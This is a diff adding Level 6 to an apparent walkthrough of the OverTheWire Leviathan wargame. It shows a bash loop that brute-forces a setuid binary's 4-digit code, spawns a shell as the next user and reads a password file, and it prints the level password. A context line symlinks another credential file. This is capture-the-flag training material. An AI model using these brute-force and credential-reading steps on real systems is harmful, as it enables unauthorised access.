@@ -238,3 +238,70 @@ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
 
 exit
 ```
+
+## Level 6
+
+* Solution -
+
+```shell
+ssh leviathan.labs.overthewire.org -p 2223 -l leviathan6
+
+ls -la
+#shows file called leviathan6, owned by leviathan7
+
+file leviathan6
+
+./leviathan6
+#shows usage as ./leviathan6 <4 digit code>
+
+./leviathan6 1234
+#wrong
+
+mktemp -d
+
+cp leviathan6 /tmp/tmp.wRugDxnPkk
+
+cd /tmp/tmp.wRugDxnPkk
+
+touch trial.sh
+
+chmod 777 trial.sh
+
+vim trial.sh
+: '
+#!/bin/bash
+
+for value in {9999..1000}
+do
+    ./leviathan6 $value
+    echo $value
+done
+'
+
+./trial.sh
+#this will brute-force the process but takes some time
+#process stops at a particular number
+
+./leviathan6 7123
+#takes us to a shell
+
+whoami
+#leviathan6, so we will need to exit and go to home directory
+
+exit
+
+cd ~
+
+./leviathan6 7123
+#takes us to shell
+
+whoami
+#leviathan7
+
+cat /etc/leviathan_pass/leviathan7
+#password (ahy7MaeBo9)
+
+exit
+
+exit
+```
